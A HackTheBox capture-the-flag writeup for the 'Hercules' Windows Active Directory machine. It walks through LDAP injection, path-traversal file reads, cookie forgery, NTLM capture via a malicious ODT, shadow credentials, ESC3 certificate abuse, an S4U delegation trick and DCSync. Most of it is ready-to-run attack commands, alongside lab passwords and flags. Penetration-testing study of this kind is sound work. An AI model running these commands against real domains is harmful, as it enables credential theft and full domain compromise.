---
title: "Hercules — HackTheBox Writeup"
date: 2026-07-31
authors:
  - pexpo
categories:
  - Active Directory
  - Windows
tags:
  - insane
  - ldap-injection
  - adcs
  - shadow-credentials
  - kerberos
  - dcsync
  - htb
slug: hercules
description: "LDAP injection → LFI cookie forge → ODT NTLM capture → Shadow creds → ESC3 → S4U session key trick → DCSync"
---

# Hercules — HackTheBox Writeup
**Difficulty:** Insane | **OS:** Windows Active Directory

<!-- more -->

## Overview

Hercules is a Windows DC with NTLM completely disabled — everything runs over Kerberos. The chain involves LDAP injection, LFI, ASP.NET cookie forgery, NTLM capture via a malicious ODT file, shadow credentials abuse through a BloodHound ACL chain, ESC3 certificate abuse, and a Kerberos S4U trick to abuse RBCD on a user account with no SPNs.

**Machine IP:** 10.129.242.196
**Domain:** hercules.htb / dc.hercules.htb
**User flag:** f90ff823ae901754df4e57a136b3b5fb
**Root flag:** d27a7812f6117f6de8f88acf276c63cf

---

## Recon

```bash
sudo nmap -Pn -sC -sV -p- --min-rate 5000 <IP> -oN hercules_scan.txt
sudo ntpdate <IP>
echo "<IP>  hercules.htb dc.hercules.htb" | sudo tee -a /etc/hosts
```

Typical DC ports — 53, 88, 443, 445, 636, 5986. SMB has NTLM disabled. IIS is vulnerable to shortname enumeration:

```bash
shortscan https://hercules.htb/
```

Found `web.config` and `precompiled.config`.

---

## Web Enumeration

```bash
ffuf -u https://hercules.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt -mc all -ac -t 100 -k
```

Only `/login` is publicly accessible.

---

## LDAP Injection

The login at `/Login` is injectable. Different error messages create a boolean oracle:

- `Invalid login attempt` → filter matched
- `Invalid Username` → no match

Payload (double URL encoded to bypass ASP.NET validation):

```
Username: *)(description=<char>*
```

Brute-forced `johnathan.j`'s description field character by character — found a password stored in plaintext. Works for `ken.w` against SMB.

```bash
nxc smb <IP> -u 'ken.w' -p 'change*th1s_p@ssw()rd!!' -k
```

---

## LFI → web.config → MachineKey

```
GET /Home/Download?fileName=../../web.config
```

Got both `decryptionKey` and `validationKey` from the machineKey.

---

## Cookie Forgery → web_admin

```bash
docker run --rm mcr.microsoft.com/dotnet/sdk:8.0 bash -c "
  mkdir /tmp/forge && cd /tmp/forge &&
  dotnet new console -n forge --force && cd forge &&
  dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5 &&
  dotnet run"
```

Swapped the `.ASPXAUTH` cookie → logged in as `web_admin`.

---

## Bad-ODF → natalie.a NTLMv2

```bash
git clone https://github.com/lof1sec/Bad-ODF.git
cd Bad-ODF && python3 Bad-ODF.py
sudo responder -I tun0 -v
```

Uploaded `bad.odt` via Forms → captured `natalie.a`'s NTLMv2.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt natalie.hash
# natalie.a : Prettyprincess123!
```

---

## BloodHound + Shadow Credentials Chain

```bash
impacket-getTGT -dc-ip <IP> hercules.htb/natalie.a:'Prettyprincess123!'
export KRB5CCNAME=natalie.a.ccache
bloodhound-python -u natalie.a -p 'Prettyprincess123!' -d hercules.htb -dc dc.hercules.htb -ns <IP> -c all
```

Chain: `natalie.a → GenericWrite → bob.w → (OU move) → stephen.m → ForceChangePassword → Auditor`

```bash
certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host dc.hercules.htb -dc-ip <IP> -account bob.w
export KRB5CCNAME=bob.w.ccache
# move stephen.m to Web Department OU via powerview
certipy-ad shadow auto -u natalie.a@hercules.htb -k -dc-host dc.hercules.htb -dc-ip <IP> -account stephen.m
export KRB5CCNAME=stephen.m.ccache
bloodyad -d hercules.htb -u stephen.m -k --host dc.hercules.htb --dc-ip <IP> set password Auditor 'Hacked123!@#'
```

---

## User Flag

```bash
impacket-getTGT -dc-ip <IP> hercules.htb/Auditor:'Hacked123!@#'
export KRB5CCNAME=Auditor.ccache
python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
# type C:\Users\auditor\Desktop\user.txt
```

---

## OU Takeover + Scheduled Task Race

```bash
bloodyad -d hercules.htb -u Auditor -k --host dc.hercules.htb --dc-ip <IP> \
  add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT'
```

Triggered "Password Cleanup" task → 10 second window → enabled `iis_administrator` → reset password → reset `IIS_Webserver$` password.

---

## ESC3 → ashley.b

```bash
impacket-getTGT 'hercules.htb/fernando.r:NewPass@123!' -dc-ip <IP>
export KRB5CCNAME=fernando.r.ccache

certipy-ad req -u fernando.r@hercules.htb -k -no-pass -ca CA-HERCULES \
  -template EnrollmentAgent -dc-ip <IP> -target dc.hercules.htb -dc-host dc.hercules.htb

certipy-ad req -u fernando.r@hercules.htb -k -no-pass -ca CA-HERCULES \
  -template User -on-behalf-of 'hercules\ashley.b' -pfx fernando.r.pfx \
  -dc-ip <IP> -target dc.hercules.htb -dc-host dc.hercules.htb -dcom

certipy-ad auth -pfx ashley.b.pfx -dc-ip <IP> -domain hercules.htb
```

---

## S4U Session Key Trick

S4U2Proxy kept failing with `KDC_ERR_BADOPTION` because `IIS_Webserver$` is a user account with no SPNs. The fix: make the NT hash equal the TGT's RC4 session key.

```bash
impacket-getTGT 'hercules.htb/IIS_Webserver$' -hashes ':<nt-hash>' -dc-ip <IP>
# extract Type:23 (RC4) session key from TGT
impacket-changepasswd 'hercules.htb/IIS_Webserver$@dc.hercules.htb' \
  -newhashes ':<session-key>' -hashes ':<nt-hash>' -dc-ip <IP> -k
impacket-getST -spn 'cifs/dc.hercules.htb' -impersonate Administrator \
  -dc-ip <IP> 'hercules.htb/IIS_Webserver$' -k -no-pass -u2u
```

---

## DCSync + Root

```bash
export KRB5CCNAME='Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache'
impacket-secretsdump -k -no-pass dc.hercules.htb -dc-ip <IP> -just-dc-user administrator
impacket-getTGT 'hercules.htb/administrator' -hashes ':<hash>' -dc-ip <IP>
export KRB5CCNAME=administrator.ccache
python3 winrmexec/evil_winrmexec.py -ssl -port 5986 -k -no-pass dc.hercules.htb
# type C:\Users\Admin\Desktop\root.txt
```

---

## Things I Learned

**LDAP injection boolean oracle** — two different error messages is all you need to extract any AD attribute character by character.

**AdminSDHolder timing** — protected accounts get ACLs reset every ~60 minutes. Trigger the cleanup task and act within the window.

**bloodyad vs impacket-changepasswd** — bloodyad syncs all keys; `-newhashes` only changes NT. This distinction makes the S4U trick work.

**S4U session key trick** — when a user account (no SPNs) is trusted for RBCD, set NT hash = TGT RC4 session key so the KDC can decrypt the S4U2Self ticket.
